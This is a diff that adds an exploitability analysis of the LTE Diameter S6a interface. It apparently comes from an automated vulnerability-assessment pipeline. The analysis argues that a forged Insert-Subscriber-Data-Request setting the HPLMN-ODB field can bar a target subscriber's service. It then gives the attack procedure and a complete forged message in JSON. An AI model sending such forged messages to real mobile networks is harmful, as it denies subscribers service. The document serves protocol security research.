@@ -1,0 +1,124 @@
+**Threat Model:**
+
+- **Attack Assumption:**
+  - The exposed Diameter endpoint is the **MME** on **S6a**.
+  - The attacker can impersonate the **HSS**, establish an unauthenticated Diameter connection to the MME, and send a forged **Insert-Subscriber-Data-Request (IDR)** for a known subscriber IMSI.
+  - The MME accepts the IDR and processes `Subscription-Data` as authoritative subscriber-profile input.
+
+- **Attacker Capability:**
+  - The attacker can send crafted IDRs only on its own Diameter connection to the victim MME and receive the corresponding answers.
+  - The attacker cannot interfere with real HSS-MME traffic, cannot operate radio/access network elements, and cannot directly realize services outside what the MME does with the received subscriber data.
+  - The analysis is therefore limited to whether changing `Subscription-Data.HPLMN-ODB` itself causes a distinct exploitable effect.
+
+**Exploitability Analysis:**
+
+`Subscription-Data.HPLMN-ODB` is field-specific exploitable under this threat model.
+
+First, direction and receiver are clear: `Insert-Subscriber-Data-Request` on S6a is sent **from HSS to MME**, and the **MME** consumes `Subscription-Data`, including `HPLMN-ODB`. The target field is therefore in a **request**, and it is processed by the victim.
+
+Second, the field semantics are authoritative and subscriber-scoped. `HPLMN-ODB` is an `Unsigned32` bitmask representing **HPLMN-specific operator-determined barring categories** for the subscriber. It is carried under `Subscription-Data` and is **not** keyed by APN, bearer, or context selector. Its scope is therefore the subscriber context in the MME.
+
+Third, the receiver processing is explicit and strong enough for exploitation. The protocol evidence states that when the MME receives `HPLMN-ODB` in `Subscription-Data`, it shall **replace the stored HPLMN-ODB data** with the received value. That means this AVP is not advisory metadata and not merely descriptive context; it is **authoritative provisioning input** that directly overwrites stored subscriber restriction state.
+
+Fourth, this replacement has concrete downstream consequences attributable to the field itself. Once the MME stores a malicious barring mask, later authorization/service procedures consult that stored state. The standards evidence supports effects such as:
+- rejection of requested service due to **operator-determined barring**;
+- **PDN connectivity failure** or service rejection with ESM cause **#8 operator determined barring**;
+- possible **bearer/service deactivation** if active service becomes barred;
+- attach/service restriction behavior using subscription/ODB-related reject causes.
+
+This is a distinct field-driven effect, not merely generic "forged IDR is bad." The specific security impact comes from **changing the subscriber's stored HPLMN-specific barring mask**. If the attacker forges an IDR without manipulating this field, that particular barring state change does not occur. The harmful behavior is therefore attributable to `HPLMN-ODB` itself.
+
+Fifth, the state impact is persistent enough to matter. The malicious value is stored in the MME subscriber context and remains effective until overwritten by a later legitimate HSS update, refreshed during later subscriber re-provisioning, or cleared by context deletion/lifecycle events. That gives the attacker a semi-persistent denial-of-service lever against the target subscriber.
+
+Recovery exists, but it is not immediate. A later legitimate IDR or subscriber refresh can repair the state, yet until that occurs the MME may continue enforcing the attacker-supplied barring mask. That persistence is sufficient for a concrete exploit chain.
+
+Accordingly, this field satisfies the EXPLOITABLE criteria:
+1. the attacker can send the forged enclosing request under the stated model;
+2. the MME processes `HPLMN-ODB` as meaningful authoritative input;
+3. the field value itself alters stored subscriber state;
+4. the result is a distinct, security-relevant service-barring effect attributable to that field.
+
+**Attack Procedure:**
+
+Craft a forged **S6a Insert-Subscriber-Data-Request** from an attacker-controlled HSS-like Diameter peer to the victim MME. Include only mandatory and coherence-related AVPs needed to make the message plausibly processable, and exclude unrelated optional data.
+
+Set the target field `Subscription-Data.HPLMN-ODB` to a **protocol-plausible non-zero barring bitmask** that the target implementation is likely to recognize as at least one supported HPLMN-specific ODB category. For semantic alignment, also include `Subscription-Data.Subscriber-Status = OPERATOR_DETERMINED_BARRING`.
+
+Use the target subscriber IMSI in `User-Name`. The expected success condition is:
+1. the MME accepts the IDR and stores/replaces the subscriber's `HPLMN-ODB`; and
+2. subsequent UE service activity for that subscriber is denied or restricted due to ODB, observable via attach/service rejection or PDN/bearer handling failures.
+
+Only the field-specific barring effect is being tested here; the message is kept minimal except for mandatory and semantically relevant siblings.
+
+**Attack Message:**
+```json
+{
+  "diameter_header": {
+    "command_code": 319,
+    "application_id": 16777251,
+    "flags": {
+      "request": true,
+      "proxiable": true
+    }
+  },
+  "avps": [
+    {
+      "avp_name": "Session-Id",
+      "avp_value": "fake-hss.example.net;1710000000;123456"
+    },
+    {
+      "avp_name": "Auth-Session-State",
+      "avp_value": 1
+    },
+    {
+      "avp_name": "Origin-Host",
+      "avp_value": "hss.fake-hss.example.net"
+    },
+    {
+      "avp_name": "Origin-Realm",
+      "avp_value": "example.net"
+    },
+    {
+      "avp_name": "Destination-Host",
+      "avp_value": "mme.epc.target.net"
+    },
+    {
+      "avp_name": "Destination-Realm",
+      "avp_value": "target.net"
+    },
+    {
+      "avp_name": "Vendor-Specific-Application-Id",
+      "grouped_avp": [
+        {
+          "avp_name": "Vendor-Id",
+          "avp_value": 10415
+        },
+        {
+          "avp_name": "Auth-Application-Id",
+          "avp_value": 16777251
+        }
+      ]
+    },
+    {
+      "avp_name": "User-Name",
+      "avp_value": "001010123456789"
+    },
+    {
+      "avp_name": "Subscription-Data",
+      "grouped_avp": [
+        {
+          "avp_name": "Subscriber-Status",
+          "avp_value": "OPERATOR_DETERMINED_BARRING"
+        },
+        {
+          "avp_name": "HPLMN-ODB",
+          "avp_value": 1
+        }
+      ]
+    }
+  ]
+}
+```
+
+**Classification:**
+- `EXPLOITABLE`
